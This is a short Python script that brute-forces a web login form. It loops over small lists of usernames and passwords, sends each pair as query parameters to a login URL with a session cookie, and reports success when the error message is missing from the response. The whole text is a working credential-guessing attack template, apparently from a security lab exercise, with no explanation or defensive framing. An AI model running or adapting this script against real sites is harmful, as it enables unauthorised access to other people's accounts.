import requests
header = {"Cookie" : "foo; PHPSESSID= bar"}
username_list=["admin", "sysadmin"]
password_list=["test123", "password"]
for i in username_list:
    for j in password_list:
        url = "https://example.com/?username="+str(i)+"&password="+str(j)+"&Login=Login"
        result = requests.get(url=url, headers=header)
        print("Username: ", i)
        print("Password: ", j)
        print("Status code: ", result.status_code)
        print("Length: ", len(result.content))
        if not "username or password incorrect ..." in str(result.content):
            print("Successfully logged in.")
        print("=================================")







